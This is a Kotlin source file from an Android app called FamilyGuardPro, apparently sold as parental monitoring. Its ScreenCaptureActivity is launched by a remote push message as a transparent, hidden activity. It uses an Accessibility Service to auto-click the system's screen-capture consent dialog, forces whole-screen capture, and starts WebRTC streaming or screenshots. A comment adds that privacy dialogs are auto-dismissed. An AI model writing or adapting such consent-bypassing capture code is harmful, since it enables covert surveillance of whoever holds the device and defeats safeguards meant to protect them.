package com.familyguardpro

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionConfig
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.familyguardpro.services.FamilyGuardAccessibilityService
import com.familyguardpro.services.WebRTCStreamService

/**
 * Transparent Activity to request MediaProjection permission for screen capture
 * This activity is launched when screen mirroring is requested via FCM
 * Uses Accessibility Service for auto-approval of the permission dialog
 */
class ScreenCaptureActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "ScreenCaptureActivity"
        const val EXTRA_START_STREAMING = "start_streaming"
        
        fun createIntent(context: Context, startStreaming: Boolean = true): Intent {
            return Intent(context, ScreenCaptureActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                putExtra(EXTRA_START_STREAMING, startStreaming)
            }
        }
    }
    
    private val handler = Handler(Looper.getMainLooper())
    
    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        Log.d(TAG, "MediaProjection result: ${result.resultCode}")
        
        // Disable auto-approval flag for initial dialog
        FamilyGuardAccessibilityService.autoApproveScreenCapture = false
        
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            Log.d(TAG, "MediaProjection permission granted!")
            
            // Store the result for WebRTCStreamService
            WebRTCStreamService.setMediaProjectionResult(result.resultCode, result.data)
            
            // Also store for ScreenshotService
            com.familyguardpro.services.ScreenshotService.setMediaProjectionResult(result.resultCode, result.data)
            
            // Check if this is for screenshot mode
            val isScreenshotMode = intent.getBooleanExtra("screenshot_mode", false)
            
            if (isScreenshotMode) {
                // Start screenshot capture
                com.familyguardpro.services.ScreenshotService.startCapture(this)
            } else if (intent.getBooleanExtra(EXTRA_START_STREAMING, true)) {
                // Start the screen capture service for streaming
                startForegroundServiceSafely(Intent(this, WebRTCStreamService::class.java).apply {
                    action = WebRTCStreamService.ACTION_START_SCREEN
                })
            }
        } else {
            Log.w(TAG, "MediaProjection permission denied")
        }
        
        // Finish the activity
        finish()
    }
    
    /**
     * Start a foreground service properly for background compatibility
     */
    private fun startForegroundServiceSafely(intent: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(this, intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "Foreground service started: ${intent.action}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service", e)
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        Log.d(TAG, "ScreenCaptureActivity started")
        
        // Make window less disruptive
        window?.apply {
            // Make the activity truly transparent and not focusable
            setBackgroundDrawable(android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT))
            decorView.systemUiVisibility = android.view.View.SYSTEM_UI_FLAG_LOW_PROFILE
            addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL)
            addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE)
            clearFlags(android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        }
        
        // Enable auto-approval via Accessibility Service before showing dialog
        enableAutoApproval()
        
        // Small delay to ensure accessibility service is ready
        handler.postDelayed({
            requestMediaProjection()
        }, 100)
    }
    
    /**
     * Enable auto-approval of MediaProjection dialog via Accessibility Service
     * This mimics the behavior of apps like AirDroid
     * Auto-disables after 30 seconds as safety timeout
     */
    private fun enableAutoApproval() {
        if (FamilyGuardAccessibilityService.instance != null) {
            Log.d(TAG, "Enabling auto-approval for screen capture dialog")
            FamilyGuardAccessibilityService.autoApproveScreenCapture = true
            // NOTE: Privacy dialog auto-dismiss happens automatically when WebRTCStreamService starts
            
            // Safety timeout: Auto-disable after 30 seconds to prevent lingering auto-clicks
            handler.postDelayed({
                Log.d(TAG, "Auto-approval timeout - disabling auto-click flag")
                FamilyGuardAccessibilityService.autoApproveScreenCapture = false
            }, 30000)
        } else {
            Log.w(TAG, "Accessibility Service not running - manual approval required")
        }
    }
    
    private fun requestMediaProjection() {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        
        // Android 14+ (API 34+): Use MediaProjectionConfig to force "Entire Screen" mode
        // This prevents the "Single app" vs "Entire screen" selection dialog
        val captureIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Force entire screen capture to avoid app selection dialog
            val config = MediaProjectionConfig.createConfigForDefaultDisplay()
            projectionManager.createScreenCaptureIntent(config)
        } else {
            // Android 13 and below - Use standard method
            projectionManager.createScreenCaptureIntent()
        }
        
        try {
            mediaProjectionLauncher.launch(captureIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to launch screen capture intent", e)
            FamilyGuardAccessibilityService.autoApproveScreenCapture = false
            finish()
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        // Ensure flag is reset
        FamilyGuardAccessibilityService.autoApproveScreenCapture = false
        handler.removeCallbacksAndMessages(null)
    }
}
